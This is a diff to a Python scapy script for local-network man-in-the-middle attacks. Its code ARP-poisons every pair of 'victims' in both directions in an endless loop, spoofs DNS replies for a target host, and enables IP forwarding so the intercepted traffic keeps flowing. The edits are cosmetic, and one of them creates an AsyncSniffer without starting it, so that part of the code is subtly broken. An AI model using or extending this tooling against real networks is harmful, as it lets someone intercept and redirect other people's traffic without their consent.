@@ -1,15 +1,15 @@
-import logging
-import platform
-import threading
-import time
 from subprocess import Popen, PIPE
-
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 from scapy.layers.inet import IP, UDP
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import ARP, getmacbyip, Ether
 from scapy.sendrecv import sendp, send, sniff
+
+import logging
+import platform
+import threading
+import time
 
 # load_layer("tls")
 
@@ -35,9 +35,9 @@ def arp_poison_targets(victims, sleep=0):
     """
     assert len(victims) >= 2, 'We must have at least 2 victims to poison'
     while True:
+        print('Poisoning targets')
         for i in range(len(victims) - 1):
             for j in range(i + 1, len(victims)):
-                print(i, j)
                 # arp poison both ways
                 arp_poisoning(victims[i], victims[j])
                 arp_poisoning(victims[j], victims[i])
@@ -86,7 +86,7 @@ def dns_sniffer():
     :return:
     """
 
-    sniff(filter="udp and port 53 and host " + target_ip, prn=dns_spoofer)
+    AsyncSniffer(filter="udp and port 53 and host " + target_ip, prn=dns_spoofer)
 
 
 def dns_spoofer(p):
@@ -148,7 +148,7 @@ def set_local_settings():
         # Enable IP forwarding
         ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
         ipf_read = ipf.read()
-        if (ipf_read != '1\n'):
+        if ipf_read != '1\n':
             ipf.write('1\n')
         ipf.close()
 
